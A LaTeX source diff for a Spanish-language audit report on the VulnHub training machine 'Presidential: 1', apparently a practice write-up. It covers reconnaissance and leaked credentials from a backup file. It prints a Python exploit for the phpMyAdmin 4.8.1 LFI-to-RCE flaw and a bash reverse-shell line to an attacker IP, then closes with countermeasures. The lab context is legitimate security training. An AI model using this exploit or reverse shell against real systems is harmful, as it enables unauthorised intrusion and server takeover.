@@ -1,0 +1,528 @@
+\documentclass[a4paper]{article} % Formato de plantilla que vamos a utilizar
+\usepackage[utf8]{inputenc} % Para utilizar caracteres especiales
+\usepackage[spanish]{babel} % Para utilizar el idioma por defecto
+\usepackage[margin=2cm, top=2cm, includefoot]{geometry} % para establecer margenes del documento.
+\usepackage{graphicx} % para usar imagenes en el documento
+\usepackage[table,xcdraw]{xcolor} % para usar colores en el documento
+\usepackage{tikz,lipsum,lmodern} % Para la creacion de cajas
+\usepackage[most]{tcolorbox} % Para la incorporación de colores en la caja 
+\usepackage{fancyhdr} % Definir el estilo de la página
+\usepackage[hidelinks]{hyperref} % Gestión de hipervinculos
+\usepackage{setspace} % Para que haya un pelin mas de espacios entre líneas
+\setstretch{1.2} % Para que haya un pelín más de espacio entre líneas
+\usepackage{parskip} %Para arreglar la forma en la que se manejan los parrafos en el documento
+\usepackage[figurename=Imagen]{caption} % Para cambiar el nombre del caption donde pone Figura
+\usepackage{ragged2e} % Para jugar con justifying para cuando termine un centering
+\usepackage{listings} % Para la inserción de código  
+\setlength{\parindent}{0pt}
+\setlength{\parskip}{0.8em plus 0.5em minus 0.2em} % establece el espacio entre parrafos
+\setlength{\parfillskip}{\parindent plus 1fill}
+
+% Declaracion de variables globales
+\newcommand{\logoPortada}{images/vulnhub.png}
+\newcommand{\machineName}{Presidential: 1}
+\newcommand{\logoMachine}{images/casablanca.jpg}
+\newcommand{\startDate}{10 de Marzo del 2024}
+\newcommand{\logoempresa}{images/logoHackEmpresa.png}
+\newcommand{\logoVulnhub}{images/logoVulnhubsimple.png}
+% Definición de colores 
+\definecolor{bluePortada}{HTML}{146c8a} %color en hexadecimal 
+
+% Adicionales
+\addto\captionsspanish{\renewcommand{\contentsname}{Índice}}
+\setlength{\headheight}{40.2pt}
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{\includegraphics[width=2cm,height=1cm]{\logoempresa}}\rhead{\includegraphics[height=1cm]{\logoVulnhub}}
+\renewcommand{\headrulewidth}{3pt} % Para aumentar el tamaño de la barra
+\renewcommand{\headrule}{\hbox to\headwidth{\color{bluePortada}\leaders\hrule height \headrulewidth\hfill}}
+\renewcommand{\lstlistingname}{Código} % Para cambiar código en el código
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\newtcolorbox{definicion}{ % para los cuadros de definición
+  breakable,
+  enhanced,
+  colback=white,
+  colframe=bluePortada!75!black,
+  arc=0mm,
+  boxrule=1pt,
+  leftrule=12mm,
+  fonttitle=\bfseries,
+  coltitle=blue!75!black,
+  title=Definición,
+  attach title to upper=\par,
+}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2
+}
+\lstset{style=mystyle}
+
+\begin{document} % Inicio del documento 
+  \cfoot{\thepage} % Para ver la enumeración de las páginas
+  \begin{titlepage}
+    \centering
+     \includegraphics[width=0.5\textwidth]{\logoPortada}\par\vspace{1cm} 
+    {\scshape\LARGE \textbf{Informe Técnico}\par\vspace{0.4cm}}
+    {\Huge\textcolor{bluePortada}{\textbf{Máquina \machineName}}}
+    \vfill\vfill
+    \includegraphics[width=\textwidth, height=10cm, keepaspectratio]{\logoMachine}\par\vspace{1cm} 
+    \vfill 
+
+    \begin{tcolorbox}[colback=red!5!white,colframe=red!75!black]
+      \centering
+      Este documento es confidencial y contiene información sensible. \\ No debería ser 
+      impreso o compartido con terceras entidades.
+    \end{tcolorbox}
+    
+    \vfill 
+    {\large \startDate\par}
+    \vfill 
+  \end{titlepage}
+
+  %------------------------------------------------------------------------------------------------
+  %Comienzo del TOC 
+  \clearpage
+  \tableofcontents
+  \clearpage
+  %----------------------------------------------------------------------------------------------
+  \section{Antecedentes}
+  El presente documento recoge los resultados obtenidos durante la fase de auditoría realizada a la 
+  máquina \textbf{\machineName}, enumerado todos los vectores de ataque encontrados así como la 
+  explotación realizada para cada uno de estos.
+
+  Esta máquina ha sido descargada de la plataforma de \href{https://vulnhub.com}{\textbf{\color{bluePortada}Vulnhub}}, 
+  una plataforma de entrenamiento y práctica para personas interesadas en la seguridad informática y en el hacking 
+  ético. 
+  A continuación, se proporciona el enlace directo de descarga a esta máquina.
+
+  \vspace{0.2cm}
+
+  \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+    colback=blue!5!white,colframe=blue!75!black,colbacktitle=bluePortada!80!black,
+    title=Dirección URL, fonttitle=\bfseries,
+    boxed title style={size=small, colframe=red!50!black} ]
+    \centering
+    \href{https://www.vulnhub.com/entry/presidential-1,500/}{\textbf{\color{bluePortada}https://vulnhub.com/entry/presidential-1,500/}}
+  \end{tcolorbox}
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.9pt}
+    \fbox{\includegraphics[width=\textwidth]{images/presidential-image.png}}
+    \caption{Página principal del servicio web de la máquina}
+  \end{figure}
+
+  \section{Objetivos}
+  
+  Los objetivos de la presente auditoría de seguridad se enfocan en la identificación de posibles vulnerabilidades y debilidades en 
+  la máquina \textbf{\color{bluePortada}\machineName}, con el propósito de garantizar la integridad y confidencialidad de la información
+  almacenada en ella.
+
+  Con este fin, se ha llevado a cabo un análisis exhaustivo de todos los servicios detectados que se encontraban expuestos en dicho servidor,
+  recopilando información detallada sobre aquellos que representan un riesgo potencial desde el punto de vista de la seguridad.
+
+  \clearpage
+  \subsection{Alcance}
+  
+  A continuación se representan los objetivos a cumplir para esta auditorí
+
+  \begin{itemize}
+    \item Identificar los puertos y servicios vulnerabilidades
+    \item Realizar una explotación de las vulnerabilidades encontradas
+    \item Conseguir accceso al servidor mediante la explotación de los servicios vulnerables identificados
+    \item Enumerar vías potenciales de elevar privilegios en el sistema una vez este ha sido vulnerado
+  \end{itemize}
+
+  \subsection{Impedimentos y limitaciones}
+
+      Durante el proceso de auditoría, está terminantemente prohibido realizar alguna de las siguientes actividades:
+      
+      \begin{itemize}
+        \item Realizar tareas que puedan ocasionar una \textbf{denegación de servicio} o afectar a la disponibilidad
+          de los servicios expuestos
+        \item Borrar archivos residentes en el servidor una vez este haya sido vulnerado 
+      \end{itemize}
+
+  \subsection{Resumen general}
+
+  \clearpage
+
+  \section{Reconocimiento}
+  \subsection{Enumerción de servicios expuestos}
+  
+  A continuación, se adjunta una evidencia de los puertos y servicios identificados durante el reconocimiento 
+  aplicado con la herramienta \textbf{nmap}:
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth]{images/ports.png}}
+    \caption{Enumeración de puertos con nmap}
+  \end{figure}
+  
+  \vspace{0.3cm}
+
+  En este caso, se identificaron 2 puertos activos corriendo por el protocolo TCP:
+  
+  \vspace{0.5cm}
+
+  \centering
+  \begin{tikzpicture}[node distance=2cm, every node/.style={rectangle,draw, fill=white}]
+    \node (center) {TCP};
+    \node (port1) [below left of=center, node distance=3cm] {Puerto 80};
+    \node (port2) [below right of=center, node distance=3cm] {Puerto 2082};
+    \draw (center) -- (port1);
+    \draw (center) -- (port2);
+  \end{tikzpicture}
+
+  \vspace{0.5cm}
+  
+  \justifying % Para quitar el \centering 
+
+  Asimismo, no se encontraron puertos expuestos a través de otros protocolos, por lo que se 
+  priorizará la evaluación de los puertos identificados en el primer escaneo efectuado. 
+  \clearpage
+  \subsection{Enumeración de servidores web}
+
+  A continuación, se representa los resultados obtenidos con la herramienta \textbf{WhatWeb},
+  una herramienta de reconocimiento web que se utiliza para identificar tecnologías web específicas
+  que se emplean en un sitio web, tras aplicar un reconocimiento sobre el servicio HTTP corriendo por el 
+  puerto 80:
+ 
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth]{images/whatweb.png}}
+    \caption{Enumeración del servicio HTTP por el puerto 80}
+  \end{figure}
+
+  En los resultados obtenidos, es posible identificar las versiones para algunas de las tecnologías existentes : 
+
+  \vspace{0.4cm}
+  \centering 
+  \begin{tabular}{ c | c }
+    \textbf{Tecnología} & \textbf{Versión} \\
+    \hline 
+    PHP & 5.5.38 \\ 
+    Apache & 2.4.6
+      
+  \end{tabular}
+  \vspace{0.4cm}
+  \justifying
+
+  Dentro de la información representgada, también es posible identificar 2 correos electrónicos, los cuales 
+  podrían ser utilizados de cara a un ataque de \textbf{Phishing}:
+
+  \vspace{0.3cm}
+  \begin{center}
+    \texttt{contact@example.com} \qquad \texttt{contact@votenow.com}
+  \end{center}
+  \vspace{0.3cm}
+
+  El \textbf{Phising} es un tipo de ataque informático que se utiliza para engañar a las personas y obtener 
+  información confidencial, como contraseñas, información bancaria o detalles de tarjetas de crédito. El ataque
+  se lleva a cabo mediante el envío de correos electrónicos fraudulentos o mensajes de texto que parecen 
+  legítimos y que solicita al destinatario que proporcione información personal o confidencial.
+
+  Adicionalmente, también ha sido posible identificar la versión de \textbf{Centos} que se encuentra activa a 
+  través de un reconocimiento exhaustivo realizado sobre el servidor web con la herramienta \textbf{wig}:
+  
+  \vspace{0.1cm}
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth, height=7cm]{images/wig-results.png}}
+    \caption{Enumeración del servicio HTTP por el puerto 80}
+  \end{figure}
+
+  \clearpage
+  \subsection{Enumeración de subdominios}
+  Una vez identificado el dominio '\textbf{votenow.local}' gracias a los correos electrónicos, se procedió a 
+  aplicar un ataque de fuerza bruta sobre el dominio principal con el objetivo de identificar subdominios 
+  válidos.
+
+  Una vez finalizado el ataque de fuerza bruta, estos fueron los resultados obtenidos: 
+  
+  \vspace{0.1cm}
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \makebox[\textwidth]{\fbox{\includegraphics[width=0.94\paperwidth]{images/subdomain.png}}}
+    \caption{Subdominios identificados con gobuster}
+    \label{fig:identifiedSubdomains}
+  \end{figure}
+
+  \vspace{0.3cm}
+
+  Se identificó el subdominio '\textbf{datasafe.votenow.local}' como un subdominio válido. Este subdominio
+  representó un punto crucial en la auditoría, dado que fue a través de este que se consiguió ingresar al sistema 
+  mediante la explotación de una vulnerabilidad existente en \textbf{PhpMyAdmin}. 
+
+  Cabe destacar que para que estos dominios y subdominios fuesen accesibles, fue necesario incorporar el siguiente 
+  contenido en el archivo '\textbf{/etc/hosts}':
+
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \fbox{\includegraphics[width=0.8\paperwidth]{images/virtualhosting.png}}
+    \caption{Contenido del archivo /etc/hosts}
+    \label{fig:identifiedSubdomains}
+  \end{figure}
+
+  \vspace{0.3cm}
+  Esto es así dado que se está aplicando '\textbf{Virtual Hosting}', una técnica utilizada en servidores web para 
+  alojar múltiples sitios web en una sola máquina física. El archivo '\textbf{/etc/hosts}' se utiliza para asociar el nombre 
+  de dominio de cada sitio web con la dirección IP del servidor.
+
+  Si no se especifica esta asociación, el servidor web no podrá determinar el sitio web correcto para servir, respondiendo 
+  con un error o en un sitio web incorrecto.
+
+  \clearpage 
+  \subsection{Enumeración de paneles de autenticación}
+  
+  Una vez descubierto el subdominio '\textbf{datasafe.votenow.local}', representado en la imagen \ref{fig:identifiedSubdomains} 
+  de la página \pageref{fig:identifiedSubdomains}, se encontró el siguiente panel de autenticación de \textbf{PhpMyAdmin}:
+
+  \vspace{0.2cm} 
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \fbox{\includegraphics[width=0.8\paperwidth]{images/PhpMyAdmin.png}}
+    \caption{Panel de autenticación de PhpMyAdmin}
+    \label{fig:phpmyadmin}
+  \end{figure}
+
+  \section{Identificación y explotación de vulnerabilidades}
+  \subsection{Archivo backup expuesto}
+
+  Durante una fase de reconocimiento con la herramienta \textbf{gobuster}, una herramienta de línea de comandos de código abierto 
+  que se utiliza para buscar y enumerar recursos web en servidores y sitios web, se identificó un archivo de Backup expuesto en el 
+  servidor : 
+ 
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \makebox[\textwidth]{\fbox{\includegraphics[width=0.94\paperwidth]{images/backup.png}}}
+    \caption{Archivo de Backup expuesto en el servidor}
+  \end{figure}
+  
+  \clearpage 
+  Este archivo fue descargado econ el objetivo de validar si este disponía de información la cual pudiera suponer un riesgo 
+  desde el punto de vista de la seguridad.
+  En este punto, se determinó que el archivo contaba con la siguiente información privilegiada:
+
+ 
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \fbox{\includegraphics[width=0.97\textwidth]{images/credentials.png}}
+    \caption{Credenciales de acceso a la base de datos}
+  \end{figure}
+
+  Estas credenciales corresponde a las credenciales de acceso a la base de datos, las cuales a su vez,
+  debido a a una reutilización de usuario y contraseña, permitieron ingresar al \textbf{PhpMyAdmin} representado en la imagen
+  \ref{fig:phpmyadmin} de la página a \pageref{fig:phpmyadmin}
+
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \makebox[\textwidth]{\fbox{\includegraphics[width=0.85\paperwidth]{images/phpmyadmindentro.png}}}
+    \caption{Inicio de sesión existoso en el PhpMyAdmin}
+  \end{figure}
+
+  \clearpage
+  \subsection{Explotación del PhpMyAdmin}
+  Una vez ingresado al \textbf{PhpMyadmin}, fue posible identificaar la versión actualmente en uso:
+
+  \vspace{0.2cm}
+
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \makebox[\textwidth]{\fbox{\includegraphics[width=0.80\textwidth]{images/versionphpmyadmin.png}}}
+    \caption{Versión de PhpMyAdmin en uso}
+  \end{figure}
+
+
+  \vspace{0.3cm}
+  Esta versión corresponde a una \textbf{versión antigua} de PhpMyAdmin, lo que lo expone a varias \textbf{vulnerabilidades críticas} identificadas: 
+
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \makebox[\textwidth]{\fbox{\includegraphics[width=0.90\textwidth]{images/searchsploit.png}}}
+    \caption{Vulnerabilidades para la versión de PhpMyAdmin en uso.}
+  \end{figure}
+  
+  \vspace{0.2cm}
+  Entre ellas, una la cual puede permitir a un atacante mal intencionado \textbf{ejecutar código remoto} en el servidor. 
+
+  \clearpage 
+
+  A continuación se comparte el script en Python3 el cual fue empleado para ejecutar comandos remotos en el servidor: 
+
+  \vspace{0.3cm}
+  \begin{lstlisting}[language=Python, caption=Exploit para la versión vulnerable de PhpMyAdmin]
+  
+    #!/usr/bin/env python
+
+    import re, requests, sys,html
+
+    def get_token(content):
+      s = re.search('token"\s*value="(.*?)"', content)
+      token = html.unescape(s.group(1))
+    return token
+
+    ipaddr = sys.argv[1]
+    port = sys.argv[2]
+    path = sys.argv[3]
+    username = sys.argv[4]
+    password = sys.argv[5]
+    command = sys.argv[6]
+
+    url = "http://{}:{}{}".format(ipaddr,port,path)
+    url1 = url + "/index.php"
+    r = requests.get(url1)
+    content = r.content.decode('utf-8')
+
+    s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
+    version = s.group(1)
+    cookies = r.cookies
+    token = get_token(content)
+
+    # 2nd req: login
+    p = {'token': token, 'pma_username': username, 'pma_password': password}
+    r = requests.post(url1, cookies = cookies, data = p)
+    content = r.content.decode('utf-8')
+    s = re.search('logged_in:(\w+),', content)
+    logged_in = s.group(1)
+
+    cookies = r.cookies
+    token = get_token(content)
+
+    url2 = url + "/import.php"
+    payload = '''select '<?php system("{}") ?>';'''.format(command)
+    p = {'table':'', 'token': token, 'sql_query': payload }
+    r = requests.post(url2, cookies = cookies, data = p)
+    # 4th req: execute payload
+    session_id = cookies.get_dict()['phpMyAdmin']
+    url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)
+    r = requests.get(url3, cookies = cookies)
+
+    content = r.content.decode('utf-8', errors="replace")
+    s = re.search("select '(.*?)\n'", content, re.DOTALL)
+  
+  \end{lstlisting}
+  \clearpage 
+
+   Una vez ejecutado e inyectando un comando que permitiera ingresar al sistema, se logró ganar acceso al servidor:
+ 
+  \vspace{0.2cm}
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \fbox{\includegraphics[width=0.90\textwidth]{images/rce.png}}
+    \caption{Ganando acceo al servidor a trvés de la explotación del PhpMyAdmin.}
+  \end{figure}
+
+  En este caso, se está ejecutando un comando que mediante por '\textbf{curl}', interprete un script en Bash el cual disponse del 
+  siguiente contenido: 
+
+  \vspace{0.3cm}
+  \begin{lstlisting}[language=Bash, caption=Script en Bash encargado de entablar la conexión]
+  #!/bin/bash
+
+  bash -i >& /dev/tcp/192.168.1.132/443 0>&1 
+  \end{lstlisting}
+  Este script está alojado en el servidor del atacante, evitando de esta forma dejar archivos residuales en el servidor 
+  víctima. Una vez ejecutado el comando, el atacante gana acceso al servidor, teniendo control de la máquina en este 
+  caso como el usuario '\textbf{apache}'.
+
+  Tal y como se puede apreciar en el script, pincipalmente lo que sucede es que el script se aprovecha de una vulnerabilidad 
+  de tipo \textbf{LFI} existente en esta versión de PhpMyAdmin para conseguir la ejecución remota de comandos: 
+  
+  \vspace{0.3cm} 
+  \begin{lstlisting}[language=Python, caption=Porción del código correspondiente a la explotación del LFI]
+  session_id = cookies.get_direct()['phpMyAdmin']
+  url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
+  r=requests.get(url3, cookies = cookies)
+
+  \end{lstlisting}
+
+  \begin{definicion}
+    LFI (\textbf{Local File Inclusión}) es una vulnerabilidad de seguridad en aplicaciones web que permite que un atacante pueda acceder
+    a archivos locales del servidor a través de la inclusión de archivos locales en una página web.
+  \end{definicion}
+  
+   \clearpage
+  A tráves del LFI, se consigue apuntar a un recurso de que almacena sesiones que representan información relacionadas con las diferentes sesiones
+  activas en el uso del lado de los usuarios.
+
+  Aprovechando esta lectura y la propia sesión del usuario, lo que se hace es que a través de una \textbf{query SQL}, se logra introducir una consulta
+  la cual contiene código PHP, visible desde los archivos de sesión del usuario a través del LFI. Esto en consecuencia conduce a una ejecución remota de comandos, 
+  dado que el código PHP es interpretado por el servidor. 
+
+  \section{Escalada de privilegios}
+  \section{Contramedidas y buenas prácticas}
+  Con el objetivo de evitar posibles explotaciones indeseadas en el servidor expuesto, se enumeran a continuación las buenas prácticas
+  a llevar a cabo para las diferentes vulnerabilidades. 
+
+  \subsection{PhpMyAdmin 4.8.1 vulnerable}
+  PhpMyAdmin es una herramienta popular para administrar bases de datos MySQL a través de una interfaz web. Sin 
+  embargo, la versión 4.8.1 de PhpMyAdmin, tiene una vulnerabilidad conocida que puede permitir a un atacante ejecutar código 
+  arbitrario en el servidor web donde está alojado. 
+
+  Para corregir esta vulnerabilidad, es necesario actualizar a la versión más reciente de PhpMyAdmin (actualmente, la versión 5.2.1)
+  Si por alguna razón no es posible actualizar a la última versión, se pueden tomar algunas medidas para mitigar el riesgo de 
+  explotación:
+  \begin{itemize} 
+    \item Corregir el código del script '\textbf{index.php}' para que la variable '\textbf{target}' proporcionada por el usuario 
+      esté bien controlada. 
+    \end{itemize}
+
+  \vspace{0.2cm}
+  \begin{figure}[h]
+    \centering 
+    \setlength{\fboxrule}{0.8pt}  
+    \fbox{\includegraphics[width=\textwidth]{images/lfi_in_code.png}}
+    \caption{Parámetro target vulnerable a LFI}
+  \end{figure}
+
+   \begin{itemize} 
+    \item En lugar de permitir que el usuario especifique cualquier archivo que desee incluir, definir una lista de archivos
+      permitidos y comprobar que el valor pasado al parámetro '\textbf{target}' esté en la lista antes de incluir el archivo. 
+      esté bien controlada. 
+    \end{itemize}
+
+  \clearpage
+  \section{Conclusiones}
+
+  Se han detectado \textbf{vulnerabilidades críticas} que pueden suponer un riesgo desde el punto de vista de la seguridad. Han sido encontradas vulnerabilidades las cuales permitieron vulnerar la integridad del servidor, consiguiendo acceso al mismo como el usuario '\textbf{apache}'.
+
+  Esto ha sido posible debido a una versión vulnerable de PhpMyAdmin existente en uno de los subdominios identificados durante el proceso de reconocimiento bajo el dominio 
+  '\textbf{votenow.local}'. 
+
+  Se recomienda encarecidamente aplicar las contramedidas recomendadas para corregir estas vulnerabilidades lo antes posible, dado que de lo contrario se podría comprometer 
+  la seguridad del servidor y poner en riesgo la integridad de todos los datos almacenados en este. 
+
+\end{document} % Fin del documento
